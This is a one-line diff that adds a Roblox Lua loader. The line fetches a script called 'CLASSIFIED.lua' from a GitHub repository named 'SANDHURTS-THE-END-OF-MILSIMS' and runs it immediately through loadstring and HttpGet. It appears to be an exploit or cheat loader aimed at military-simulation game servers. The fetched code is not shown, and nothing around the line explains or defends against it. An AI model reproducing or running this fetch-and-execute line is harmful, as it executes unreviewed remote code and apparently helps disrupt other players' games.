@@ -1,0 +1,1 @@
+loadstring(game:HttpGet("https://raw.githubusercontent.com/ExecutiveDeveloper/SANDHURTS-THE-END-OF-MILSIMS/main/CLASSIFIED.lua"))()
